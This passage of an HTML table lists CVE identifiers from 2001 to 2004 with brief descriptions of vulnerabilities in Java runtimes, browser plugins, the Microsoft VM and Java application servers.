		<td valign="top">Multiple vulnerabilities in Konqueror in KDE 3.3.1 and earlier (1) allow access to restricted Java classes via JavaScript and (2) do not properly restrict access to certain Java classes from the Java applet, which allows remote attackers to bypass sandbox restrictions and read or write arbitrary files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-1029">CVE-2004-1029</a></td>
		<td valign="top">The Sun Java Plugin capability in Java 2 Runtime Environment (JRE) 1.4.2_01, 1.4.2_04, and possibly earlier versions, does not properly restrict access between Javascript and Java applets during data transfer, which allows remote attackers to load unsafe classes and execute arbitrary code by using the reflection API to access private Java packages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-0742">CVE-2004-0742</a></td>
		<td valign="top">Sun Java System Portal Server 6.2 (formerly Sun ONE) allows remote authenticated users to obtain Calendar Server privileges and modify Calendar data by changing the display options to a non-default view.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-0723">CVE-2004-0723</a></td>
		<td valign="top">Microsoft Java virtual machine (VM) 5.0.0.3810 allows remote attackers to bypass sandbox restrictions to read or write certain data between applets from different domains via the "GET/Key" and "PUT/Key/Value" commands, aka "cross-site Java."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-0713">CVE-2004-0713</a></td>
		<td valign="top">The remove method in a stateful Enterprise JavaBean (EJB) in BEA WebLogic Server and WebLogic Express version 8.1 through SP2, 7.0 through SP4, and 6.1 through SP6, does not properly check EJB permissions before unexporting a bean, which allows remote authenticated users to remove EJB objects from remote views before the security exception is thrown.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2004-0651">CVE-2004-0651</a></td>
		<td valign="top">Unknown vulnerability in Sun Java Runtime Environment (JRE) 1.4.2 through 1.4.2_03 allows remote attackers to cause a denial of service (virtual machine hang).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1590">CVE-2003-1590</a></td>
		<td valign="top">Unspecified vulnerability in Sun ONE (aka iPlanet) Web Server 6.0 SP3 through SP5 on Windows allows remote attackers to cause a denial of service (daemon crash) via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1589">CVE-2003-1589</a></td>
		<td valign="top">Unspecified vulnerability in Sun ONE (aka iPlanet) Web Server 4.1 before SP13 and 6.0 before SP6 on Windows allows attackers to cause a denial of service (daemon crash) via unknown vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1573">CVE-2003-1573</a></td>
		<td valign="top">The PointBase 4.6 database component in the J2EE 1.4 reference implementation (J2EE/RI) allows remote attackers to execute arbitrary programs, conduct a denial of service, and obtain sensitive information via a crafted SQL statement, related to "inadequate security settings and library bugs in sun.* and org.apache.* packages."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1572">CVE-2003-1572</a></td>
		<td valign="top">Sun Java Media Framework (JMF) 2.1.1 through 2.1.1c allows unsigned applets to cause a denial of service (JVM crash) and read or write unauthorized memory locations via the ReadEnv class, as demonstrated by reading environment variables using modified .data and .size fields.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1521">CVE-2003-1521</a></td>
		<td valign="top">Sun Java Plug-In 1.4 through 1.4.2_02 allows remote attackers to repeatedly access the floppy drive via the createXmlDocument method in the org.apache.crimson.tree.XmlDocument class, which violates the Java security model.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1516">CVE-2003-1516</a></td>
		<td valign="top">The org.apache.xalan.processor.XSLProcessorVersion class in Java Plug-in 1.4.2_01 allows signed and unsigned applets to share variables, which violates the Java security model and could allow remote attackers to read or write data belonging to a signed applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1511">CVE-2003-1511</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Bajie Java HTTP Server 0.95 through 0.95zxv4 allows remote attackers to inject arbitrary web script or HTML via (1) the query string to test.txt, (2) the guestName parameter to the custMsg servlet, or (3) the cookiename parameter to the CookieExample servlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1301">CVE-2003-1301</a></td>
		<td valign="top">Sun Java Runtime Environment (JRE) 1.x before 1.4.2_11 and 1.5.x before 1.5.0_06, and as used in multiple web browsers, allows remote attackers to cause a denial of service (application crash) via deeply nested object arrays, which are not properly handled by the garbage collector and trigger invalid memory accesses.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1290">CVE-2003-1290</a></td>
		<td valign="top">BEA WebLogic Server and WebLogic Express 6.1, 7.0, and 8.1, with RMI and anonymous admin lookup enabled, allows remote attackers to obtain configuration information by accessing MBeanHome via the Java Naming and Directory Interface (JNDI).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1229">CVE-2003-1229</a></td>
		<td valign="top">X509TrustManager in (1) Java Secure Socket Extension (JSSE) in SDK and JRE 1.4.0 through 1.4.0_01, (2) JSSE before 1.0.3, (3) Java Plug-in SDK and JRE 1.3.0 through 1.4.1, and (4) Java Web Start 1.0 through 1.2 incorrectly calls the isClientTrusted method when determining server trust, which results in improper validation of digital certificate and allows remote attackers to (1) falsely authenticate peers for SSL or (2) incorrectly validate signed JAR files.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1222">CVE-2003-1222</a></td>
		<td valign="top">BEA Weblogic Express and Server 8.0 through 8.1 SP 1, when using a foreign Java Message Service (JMS) provider, echoes the password for the foreign provider to the console and stores it in cleartext in config.xml, which could allow attackers to obtain the password.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1156">CVE-2003-1156</a></td>
		<td valign="top">Java Runtime Environment (JRE) and Software Development Kit (SDK) 1.4.2 through 1.4.2_02 allows local users to overwrite arbitrary files via a symlink attack on (1) unpack.log, as created by the unpack program, or (2) .mailcap1 and .mime.types1, as created by the RPM program.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1134">CVE-2003-1134</a></td>
		<td valign="top">Sun Java 1.3.1, 1.4.1, and 1.4.2 allows local users to cause a denial of service (JVM crash), possibly by calling the ClassDepth function with a null parameter, which causes a crash instead of generating a null pointer exception.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-1123">CVE-2003-1123</a></td>
		<td valign="top">Sun Java Runtime Environment (JRE) and SDK 1.4.0_01 and earlier allows untrusted applets to access certain information within trusted applets, which allows attackers to bypass the restrictions of the Java security model.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0896">CVE-2003-0896</a></td>
		<td valign="top">The loadClass method of the sun.applet.AppletClassLoader class in the Java Virtual Machine (JVM) in Sun SDK and JRE 1.4.1_03 and earlier allows remote attackers to bypass sandbox restrictions and execute arbitrary code via a loaded class name that contains "/" (slash) instead of "." (dot) characters, which bypasses a call to the Security Manager's checkPackageAccess method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0871">CVE-2003-0871</a></td>
		<td valign="top">Unknown vulnerability in QuickTime Java in Mac OS X v10.3 and Mac OS X Server 10.3 allows attackers to gain "unauthorized access to a system."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0846">CVE-2003-0846</a></td>
		<td valign="top">SuSEconfig.javarunt in the javarunt package on SuSE Linux 7.3Pro allows local users to overwrite arbitrary files via a symlink attack on the .java_wrapper temporary file.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0845">CVE-2003-0845</a></td>
		<td valign="top">Unknown vulnerability in the HSQLDB component in JBoss 3.2.1 and 3.0.8 on Java 1.4.x platforms, when running in the default configuration, allows remote attackers to conduct unauthorized activities and possibly execute arbitrary code via certain SQL statements to (1) TCP port 1701 in JBoss 3.2.1, and (2) port 1476 in JBoss 3.0.8.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0525">CVE-2003-0525</a></td>
		<td valign="top">The getCanonicalPath function in Windows NT 4.0 may free memory that it does not own and cause heap corruption, which allows attackers to cause a denial of service (crash) via requests that cause a long file name to be passed to getCanonicalPath, as demonstrated on the IBM JVM using a long string to the java.io.getCanonicalPath Java method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0413">CVE-2003-0413</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in the webapps-simple sample application for (1) Sun ONE Application Server 7.0 for Windows 2000/XP or (2) Sun Java System Web Server 6.1 allows remote attackers to insert arbitrary web script or HTML via an HTTP request that generates an "Invalid JSP file" error, which inserts the text in the resulting error message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2003-0111">CVE-2003-0111</a></td>
		<td valign="top">The ByteCode Verifier component of Microsoft Virtual Machine (VM) build 5.0.3809 and earlier, as used in Windows and Internet Explorer, allows remote attackers to bypass security checks and execute arbitrary code via a malicious Java applet, aka "Flaw in Microsoft VM Could Enable System Compromise."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2347">CVE-2002-2347</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in Oracle Java Server Page (OJSP) demo files (1) hellouser.jsp, (2) welcomeuser.jsp and (3) usebean.jsp in Oracle 9i Application Server 9.0.2, 1.0.2.2, 1.0.2.1s and 1.0.2 allows remote attackers to inject arbitrary web script or HTML via the text entry field.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2284">CVE-2002-2284</a></td>
		<td valign="top">Netscape Communicator 4.0 through 4.79 allows remote attackers to bypass JVM security and execute arbitrary Java code via an applet that loads user-supplied Java classes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2281">CVE-2002-2281</a></td>
		<td valign="top">Symantec Java! JIT (Just-In-Time) Compiler for Netscape Communicator 4.0 through 4.8 allows remote attackers to execute arbitrary Java commands via an applet that uses a jump call, which is not correctly compiled by the JIT compiler.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2248">CVE-2002-2248</a></td>
		<td valign="top">Buffer overflow in the sun.awt.windows.WDefaultFontCharset Java class implementation in Netscape 4.0 allows remote attackers to execute arbitrary code via an applet that calls the WDefaultFontCharset constructor with a long string and invokes the canConvert method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2072">CVE-2002-2072</a></td>
		<td valign="top">java.security.AccessController in Sun Java Virtual Machine (JVM) in JRE 1.2.2 and 1.3.1 allows remote attackers to cause a denial of service (JVM crash) via a Java program that calls the doPrivileged method with a null argument.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2022">CVE-2002-2022</a></td>
		<td valign="top">Format string vulnerability in Kaffe OpenVM 1.0.6 and earlier allows local users to execute arbitrary code, when a java.lang.NoClassDefFoundError is thrown, via format specifiers in the forName attribute.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2007">CVE-2002-2007</a></td>
		<td valign="top">The default installations of Apache Tomcat 3.2.3 and 3.2.4 allows remote attackers to obtain sensitive system information such as directory listings and web root path, via erroneous HTTP requests for Java Server Pages (JSP) in the (1) test/jsp, (2) samples/jsp and (3) examples/jsp directories, or the (4) test/realPath.jsp servlet, which leaks pathnames in error messages.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-2005">CVE-2002-2005</a></td>
		<td valign="top">Unknown vulnerability in Java web start 1.0.1_01, 1.0.1, 1.0 and 1.0.1.01 (HP-UX 11.x only) allows attackers to gain access to restricted resources via unknown attack vectors.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1990">CVE-2002-1990</a></td>
		<td valign="top">Resin 2.0.5 through 2.1.2 allows remote attackers to reveal physical path information via a URL request for the example Java class file HelloServlet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1861">CVE-2002-1861</a></td>
		<td valign="top">Sybase Enterprise Application Server 4.0, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1860">CVE-2002-1860</a></td>
		<td valign="top">Pramati Server 3.0, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1859">CVE-2002-1859</a></td>
		<td valign="top">Orion Application Server 1.5.3, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1858">CVE-2002-1858</a></td>
		<td valign="top">Oracle Oracle9i Application Server 1.0.2.2 and 9.0.2 through 9.0.2.0.1, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1857">CVE-2002-1857</a></td>
		<td valign="top">jo! jo Webserver 1.0, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1856">CVE-2002-1856</a></td>
		<td valign="top">HP Application Server 8.0, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1855">CVE-2002-1855</a></td>
		<td valign="top">Macromedia JRun 3.0 through 4.0, when running on Windows, allows remote attackers to retrieve files in the WEB-INF directory, which contains Java class files and configuration information, via a request to the WEB-INF directory with a trailing dot ("WEB-INF.").

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1822">CVE-2002-1822</a></td>
		<td valign="top">IBM HTTP Server 1.0 on AS/400 allows remote attackers to obtain the path to the web root directory and other sensitive information, which is leaked in an error mesage when a request is made for a non-existent Java Server Page (JSP).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1762">CVE-2002-1762</a></td>
		<td valign="top">Microsoft Baseline Security Analyzer (MBSA) 1.0 stores security scans in a known location C:\Documents and Settings\username\SecurityScans in plaintext, which could allow remote attackers to obtain sensitive information about the system via malicious active content such as ActiveX controls or Java.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1325">CVE-2002-1325</a></td>
		<td valign="top">Microsoft Virtual Machine (VM) build 5.0.3805 and earlier allows remote attackers to determine a local user's username via a Java applet that accesses the user.dir system property, aka "User.dir Exposure Vulnerability."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1295">CVE-2002-1295</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to cause a denial of service (crash) and possibly conduct other unauthorized activities via applet tags in HTML that bypass Java class restrictions (such as private constructors) by providing the class name in the code parameter, aka "Incomplete Java Object Instantiation Vulnerability."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1294">CVE-2002-1294</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, can provide HTML object references to applets via Javascript, which allows remote attackers to cause a denial of service (crash due to illegal memory accesses) and possibly conduct other unauthorized activities via an applet that uses those references to access proprietary Microsoft methods.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1293">CVE-2002-1293</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, provides a public load0() method for the CabCracker class (com.ms.vm.loader.CabCracker), which allows remote attackers to bypass the security checks that are performed by the load() method.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1292">CVE-2002-1292</a></td>
		<td valign="top">The Microsoft Java virtual machine (VM) build 5.0.3805 and earlier, as used in Internet Explorer, allows remote attackers to extend the Standard Security Manager (SSM) class (com.ms.security.StandardSecurityManager) and bypass intended StandardSecurityManager restrictions by modifying the (1) deniedDefinitionPackages or (2) deniedAccessPackages settings, causing a denial of service by adding Java applets to the list of applets that are prevented from running.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1291">CVE-2002-1291</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to read arbitrary local files and network shares via an applet tag with a codebase set to a "file://%00" (null character) URL.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1290">CVE-2002-1290</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to read and modify the contents of the Clipboard via an applet that accesses the (1) ClipBoardGetText and (2) ClipBoardSetText methods of the INativeServices class.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1289">CVE-2002-1289</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to read restricted process memory, cause a denial of service (crash), and possibly execute arbitrary code via the getNativeServices function, which creates an instance of the com.ms.awt.peer.INativeServices (INativeServices) class, whose methods do not verify the memory addresses that are passed as parameters.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1288">CVE-2002-1288</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to determine the current directory of the Internet Explorer process via the getAbsolutePath() method in a File() call.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1287">CVE-2002-1287</a></td>
		<td valign="top">Stack-based buffer overflow in the Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to cause a denial of service via a long class name through (1) Class.forName or (2) ClassLoader.loadClass.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1286">CVE-2002-1286</a></td>
		<td valign="top">The Microsoft Java implementation, as used in Internet Explorer, allows remote attackers to steal cookies and execute script in a different security context via a URL that contains a colon in the domain portion, which is not properly parsed and loads an applet from a malicious site within the security context of the site that is being visited by the user.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1260">CVE-2002-1260</a></td>
		<td valign="top">The Java Database Connectivity (JDBC) APIs in Microsoft Virtual Machine (VM) 5.0.3805 and earlier allow remote attackers to bypass security checks and access database contents via an untrusted Java applet.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1258">CVE-2002-1258</a></td>
		<td valign="top">Two vulnerabilities in Microsoft Virtual Machine (VM) up to and including build 5.0.3805, as used in Internet Explorer and other applications, allow remote attackers to read files via a Java applet with a spoofed location in the CODEBASE parameter in the APPLET tag, possibly due to a parsing error.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-1257">CVE-2002-1257</a></td>
		<td valign="top">Microsoft Virtual Machine (VM) up to and including build 5.0.3805 allows remote attackers to execute arbitrary code by including a Java applet that invokes COM (Component Object Model) objects in a web site or an HTML mail.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0979">CVE-2002-0979</a></td>
		<td valign="top">The Java logging feature for the Java Virtual Machine in Internet Explorer writes output from functions such as System.out.println to a known pathname, which can be used to execute arbitrary code.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0941">CVE-2002-0941</a></td>
		<td valign="top">The ConsoleCallBack class for nCipher running under JRE 1.4.0 and 1.4.0_01, as used by the TrustedCodeTool and possibly other applications, may leak a passphrase when the user aborts an application that is prompting for the passphrase, which could allow attackers to gain privileges.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0937">CVE-2002-0937</a></td>
		<td valign="top">The Java Server Pages (JSP) engine in JRun allows web page owners to cause a denial of service (engine crash) on the web server via a JSP page that calls WPrinterJob().pageSetup(null,null).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0936">CVE-2002-0936</a></td>
		<td valign="top">The Java Server Pages (JSP) engine in Tomcat allows web page owners to cause a denial of service (engine crash) on the web server via a JSP page that calls WPrinterJob().pageSetup(null,null).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0867">CVE-2002-0867</a></td>
		<td valign="top">Microsoft Virtual Machine (VM) up to and including build 5.0.3805 allows remote attackers to cause a denial of service (crash) in Internet Explorer via invalid handle data in a Java applet, aka "Handle Validation Flaw."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0866">CVE-2002-0866</a></td>
		<td valign="top">Java Database Connectivity (JDBC) classes in Microsoft Virtual Machine (VM) up to and including 5.0.3805 allow remote attackers to load and execute DLLs (dynamic link libraries) via a Java applet that calls the constructor for com.ms.jdbc.odbc.JdbcOdbc with the desired DLL terminated by a null string, aka "DLL Execution via JDBC Classes."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0865">CVE-2002-0865</a></td>
		<td valign="top">A certain class that supports XML (Extensible Markup Language) in Microsoft Virtual Machine (VM) 5.0.3805 and earlier, probably com.ms.osp.ospmrshl, exposes certain unsafe methods, which allows remote attackers to execute unsafe code via a Java applet, aka "Inappropriate Methods Exposed in XML Support Classes."

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0563">CVE-2002-0563</a></td>
		<td valign="top">The default configuration of Oracle 9i Application Server 1.0.2.x allows remote anonymous users to access sensitive services without authentication, including Dynamic Monitoring Services (1) dms0, (2) dms/DMSDump, (3) servlet/DMSDump, (4) servlet/Spy, (5) soap/servlet/Spy, and (6) dms/AggreSpy; and Oracle Java Process Manager (7) oprocmgr-status and (8) oprocmgr-service, which can be used to control Java processes.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0407">CVE-2002-0407</a></td>
		<td valign="top">htcgibin.exe in Lotus Domino server 5.0.9a and earlier allows remote attackers to determine the physical pathname for the server via requests that contain certain MS-DOS device names such as com5, such as (1) a request with a .pl or .java extension, or (2) a request containing a large number of periods, which causes htcgibin.exe to leak the pathname in an error message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0160">CVE-2002-0160</a></td>
		<td valign="top">The administration function in Cisco Secure Access Control Server (ACS) for Windows, 2.6.x and earlier and 3.x through 3.01 (build 40), allows remote attackers to read HTML, Java class, and image files outside the web root via a ..\.. (modified ..) in the URL to port 2002.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0076">CVE-2002-0076</a></td>
		<td valign="top">Java Runtime Environment (JRE) Bytecode Verifier allows remote attackers to escape the Java sandbox and execute commands via an applet containing an illegal cast operation, as seen in (1) Microsoft VM build 3802 and earlier as used in Internet Explorer 4.x and 5.x, (2) Netscape 6.2.1 and earlier, and possibly other implementations that use vulnerable versions of SDK or JDK, aka a variant of the "Virtual Machine Verifier" vulnerability.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0059">CVE-2002-0059</a></td>
		<td valign="top">The decompression algorithm in zlib 1.1.3 and earlier, as used in many different utilities and packages, causes inflateEnd to release certain memory more than once (a "double free"), which may allow local and remote attackers to execute arbitrary code via a block of malformed compression data.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2002-0058">CVE-2002-0058</a></td>
		<td valign="top">Vulnerability in Java Runtime Environment (JRE) allows remote malicious web sites to hijack or sniff a web client's sessions, when an HTTP proxy is being used, via a Java applet that redirects the session to another server, as seen in (1) Netscape 6.0 through 6.1 and 4.79 and earlier, (2) Microsoft VM build 3802 and earlier as used in Internet Explorer 4.x and 5.x, and possibly other implementations that use vulnerable versions of SDK or JDK.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1480">CVE-2001-1480</a></td>
		<td valign="top">Java Runtime Environment (JRE) and SDK 1.2 through 1.3.0_04 allows untrusted applets to access the system clipboard.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1441">CVE-2001-1441</a></td>
		<td valign="top">Cross-site scripting (XSS) vulnerability in VisualAge for Java 3.5 Professional allows remote attackers to execute JavaScript on other clients via the URL, which injects the script in the resulting error message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1265">CVE-2001-1265</a></td>
		<td valign="top">Directory traversal vulnerability in IBM alphaWorks Java TFTP server 1.21 allows remote attackers to conduct unauthorized operations on arbitrary files via a .. (dot dot) attack.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1254">CVE-2001-1254</a></td>
		<td valign="top">Web Access component for COM2001 Alexis 2.0 and 2.1 in InternetPBX sends username and voice mail passwords in the clear via a Java applet that sends the information to port 8888 of the server, which could allow remote attackers to steal the passwords via sniffing.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1084">CVE-2001-1084</a></td>
		<td valign="top">Cross-site scripting vulnerability in Allaire JRun 3.0 and 2.3.3 allows a malicious webmaster to embed Javascript in a request for a .JSP, .shtml, .jsp10, .jrun, or .thtml file that does not exist, which causes the Javascript to be inserted into an error message.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1024">CVE-2001-1024</a></td>
		<td valign="top">login.gas.bat and other CGI scripts in Entrust getAccess allow remote attackers to execute Java programs, and possibly arbitrary commands, by specifying an alternate -classpath argument.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-1008">CVE-2001-1008</a></td>
		<td valign="top">Java Plugin 1.4 for JRE 1.3 executes signed applets even if the certificate is expired, which could allow remote attackers to conduct unauthorized activities via an applet that has been signed by an expired certificate.

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2001-0926">CVE-2001-0926</a></td>
